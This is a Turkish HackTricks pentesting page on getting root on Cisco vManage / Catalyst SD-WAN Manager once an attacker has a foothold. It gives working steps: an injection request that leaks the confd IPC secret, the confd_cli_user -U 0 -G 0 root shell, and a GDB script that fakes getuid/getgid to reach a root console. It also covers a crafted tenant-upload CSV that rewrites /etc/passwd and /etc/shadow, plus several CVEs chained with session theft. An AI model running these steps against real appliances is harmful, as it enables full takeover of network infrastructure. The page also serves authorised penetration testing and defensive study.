# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Cisco vManage / *Catalyst SD-WAN Manager* üzerinde `vmanage`, `netadmin` veya `vmanage-admin` olarak code execution elde ettikten sonra, en ilginç local privesc yüzeyleri genellikle `confd` CLI stack, `cmdptywrapper` helper, localhost REST APIs ve root-owned import/upload handlers olur.

Bir controller üzerinde hâlâ **initial foothold** gerekiyorsa, önce özel control-plane sayfasını kontrol edin:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Eğer `/etc/confd/confd_ipc_secret` foothold’unuzdan okunabiliyorsa, Path 1 ve Path 2 hemen uygulanabilir hale gelir. Bir remote info leak veya webshell üzerinden geldiyseniz, ayrıca `vmanage-admin` SSH material’ine veya multitenancy upload handlers’a zaten erişip erişemediğinizi de kontrol edin: 2026 araştırması, her ikisinin de gerçekçi basamaklar olduğunu gösterdi.

## Path 1

(Örnek: [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

`confd` ve farklı binaries ile ilgili bazı [documentation](http://66.218.245.39/doc/html/rn03re18.html) içinde biraz araştırma yaptıktan sonra (Cisco web sitesindeki bir account ile erişilebilir), IPC socket’i authenticate etmek için `/etc/confd/confd_ipc_secret` içinde bulunan bir secret kullandığını bulduk:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Neo4j instance’ımızı hatırlıyor musun? `vmanage` kullanıcısının yetkileri altında çalışıyor, bu da önceki vulnerability'yi kullanarak dosyayı almamıza izin veriyor:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` programı komut satırı argümanlarını desteklemez ancak argümanlarla `/usr/bin/confd_cli_user` çağırır. Bu yüzden doğrudan `/usr/bin/confd_cli_user` programını kendi argümanlarımızla çağırabiliriz. Ancak mevcut yetkilerimizle okunabilir değil, bu yüzden onu rootfs’den alıp `scp` kullanarak kopyalamamız, yardım bilgisini okumamız ve shell almak için onu kullanmamız gerekir:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Path 2

(Örnek: [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

synacktiv ekibinin blog¹ yazısı root shell elde etmek için zarif bir yöntem anlattı, ancak dezavantajı `/usr/bin/confd_cli_user` dosyasının bir kopyasını gerektirmesidir; bu dosya yalnızca root tarafından okunabilir. Ben, böyle bir zahmete girmeden root yetkisine yükselmek için başka bir yol buldum.

`/usr/bin/confd_cli` binary dosyasını disassemble ettiğimde, şunları gözlemledim:

<details>
<summary>UID/GID toplamasını gösteren Objdump</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

“ps aux” çalıştırdığımda, aşağıdakileri gözlemledim (_note -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
“confd_cli” programının, oturum açmış kullanıcıdan topladığı user ID ve group ID’yi “cmdptywrapper” uygulamasına aktardığını varsaydım.

İlk denemem, “cmdptywrapper”ı doğrudan çalıştırıp `-g 0 -u 0` vermek oldu, ancak başarısız oldu. Görünüşe göre yol üzerinde bir yerde bir file descriptor (-i 1015) oluşturulmuş ve bunu sahteleyemiyorum.

synacktiv’in blogunda belirtildiği gibi (son örnek), “confd_cli” programı command line argument desteklemiyor, ancak onu bir debugger ile etkileyebiliyorum ve neyse ki sistemde GDB mevcut.

API `getuid` ve `getgid`’in 0 döneceği şekilde zorladığım bir GDB script’i oluşturdum. Deserialization RCE üzerinden zaten “vmanage” privilege elde ettiğim için, `/etc/confd/confd_ipc_secret` dosyasını doğrudan okumaya yetkim var.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
<details>
<summary>Konsol çıktısı</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Yol 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco daha sonra kendi advisory’sinde [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt) için daha temiz bir local root yolu belgeledi: yalnızca **read-only privileges** olan kimliği doğrulanmış bir attacker, yetersiz input validation nedeniyle manager CLI’ya crafted bir request gönderebilir ve root’a sıçrayabilirdi.

Offensive perspective’den bakınca, asıl önemli çıkarım şudur:

1. Box üzerinde herhangi bir düşük-priv foothold elde ettiğiniz anda, daha ağır Path 1 / Path 2 workflow’una geçmeden önce local CLI service’i test etmelisiniz.
2. Trust boundary’yi bulmak için Path 2’deki artifacts’leri yeniden kullanın: `confd_cli` → `cmdptywrapper` → `vshell`.
3. CLI backend’e iletilen her field’ı şüpheli kabul edin: UID/GID, username, terminal metadata, imported files veya daha sonra root-owned bir helper tarafından tüketilen herhangi bir value.
4. Düşük-priv bir user local CLI socket’e erişebiliyor ve bu field’ları influence edebiliyorsa, root yalnızca tek bir crafted request uzakta olabilir.

Appliance üzerinde landing yaptıktan sonra pratik workflow şöyledir:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Bu, 2025 bug’ını benzer sürümler için iyi bir hunting pattern’ine dönüştürür: kullanıcı alanında kimlik bilgisi toplayıp bunu daha ayrıcalıklı bir wrapper’a ileten **local CLI shims** arayın.

**CVE-2025-20122** ile daha sonraki **CVE-2026-20122**’yi karıştırmayın: 2025 problemi *local* bir CLI-to-root bug’ıdır, 2026 problemi ise çoğunlukla bir foothold yerleştirmek ve ardından Path 1 / Path 2 / Path 4’e geri dönmek için yararlı olan *remote* bir API arbitrary file overwrite’ıdır.

## Path 4 (2026 düşük yetkili REST API’den root’a - CVE-2026-20126)

Cisco’nun Şubat 2026 advisory’si ayrıca başka bir yararlı privesc sınıfı da tanıttı: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v), REST API’de yetersiz bir user-authentication mekanizması nedeniyle **kimliği doğrulanmış, düşük yetkili yerel bir saldırganın** root elde etmesine izin veriyordu.

Bu önemlidir çünkü vManage privesc artık sadece `confd`/TTY abuse ile sınırlı değil. Düşük yetkili bir shell’den sonra ayrıca şunları da arayın:

- çağırana fazla güvenen localhost-only API endpoints
- mevcut hesap tarafından okunabilen tokens, cookies veya service credentials
- `dataservice`/REST handlers üzerinden açığa çıkan ve yine de local olarak tetiklenebilen root-only actions

Pratikte, `vmanage` veya başka bir service user olarak shell elde ettiğinizde, local API abuse çoğu zaman interactive CLI abuse’a göre daha sessiz ve otomasyona daha uygundur:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Eğer local session context, privileged REST işlevselliğine ulaşmak için yeterliyse, API path'i tercih edin: yeniden oynatmak, script'e dökmek ve stolen web sessions veya API tokens ile zincirlemek daha kolaydır.

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

Başka bir recent pattern [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): `netadmin` yetkilerine sahip yerel bir attacker, CLI'nin daha sonra güvensiz şekilde işlediği **crafted file** yükleyebilir ve bu da `root` olarak command injection'a yol açabilirdi.

HackTricks açısından bakıldığında, değerli teknik belirli CVE'den daha geniştir:

1. File kabul eden her CLI veya web workflow'unu enumerate edin: imports, diagnostic bundles, templates, validators, backups, tenant data, vb.
2. Yüklenen file'ın nereye gittiğini ve hangi root-owned script veya binary tarafından tüketildiğini trace edin.
3. Filename, file content veya parsed metadata'nın shell commands, wrapper scripts veya `system()`-style helpers'a hiç aktarılıp aktarılmadığını test edin.
4. Zaten `netadmin`'e ulaşabiliyorsanız (geçerli creds, stolen session veya bir auth-bypass chain), file-processing bug'ları çoğu zaman root'a giden en hızlı yoldur.

Google Cloud / Mandiant daha sonra bu bug class'ının çok somut bir örneğinin multitenancy import path üzerinden exploit edildiğini gösterdi:
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
Gözlemlenen saldırıda, hazırlanmış CSV `/etc/passwd` ve `/etc/shadow` dosyalarını değiştirerek geçici bir UID 0 hesabı (`troot`) oluşturdu. Bu da `tenant-upload` / `tenant-list` tarzı importer’ları özellikle ilginç kılıyor: bunlar sadece veri alma özellikleri değil, aynı zamanda potansiyel olarak root-owned parser front-end’lerdir.

Hızlı bir shell tarafı avlama paterni şudur:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Bu bug sınıfı, özellikle `root` değil de `netadmin` veren remote foothold’larla çok iyi zincirlenir.

## Zincirlenebilecek diğer yakın tarihli vManage/Catalyst SD-WAN Manager vulns

- **Unauthenticated info leak (CVE-2026-20133)** – Özellikle yüksek değerli çünkü public research bunun `confd_ipc_secret` veya `vmanage-admin` private key sızdırabileceğini gösterdi; böylece bir read bug ya Path 1’e ya da bir NETCONF pivot’a dönüşür.
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – Yukarıdaki 2025 CLI bug’ından farklıdır; VulnCheck bunu bir webshell yüklemek için kullandı ve bu da bu sayfadaki local privesc yollarını hemen relevant hale getirir.
- **Authenticated UI XSS (CVE-2024-20475)** – Web UI’da bir admin session çal, ardından sonunda `vshell`’e veya yukarıdaki local privesc yollarından birine ulaşan API/CLI aksiyonlarına pivot et.
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – 5. Yol için çok güçlü bir öncül çünkü `netadmin`, 2026 crafted-file privesc için gereken tam seviyedir.
- **Authenticated arbitrary file write (CVE-2026-20262)** – CVE-2026-20122 ile benzer offensive value’ya sahiptir ama daha geç bir web UI upload path üzerinden: sonradan root ya da management-plane web tier tarafından parse edilecek bir konuma yaz.
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – 2026 intrusions, saldırganların eski ve vulnerable bir SD-WAN build’e geri dönebileceğini, eski CLI root bug’ını abuse edebileceğini ve ardından orijinal versiyonu geri yükleyebileceğini gösterdi.
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Dedicated SD-WAN control-plane sayfasında daha iyi dokümante edilmiştir; `vmanage-admin` için bir SSH key ekleyebilir ve bu sayfayı yeniden ziyaret etmek için gereken local foothold’u sağlar.



## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [VulnCheck: Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [Google Cloud / Mandiant: Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
{{#include ../../banners/hacktricks-training.md}}
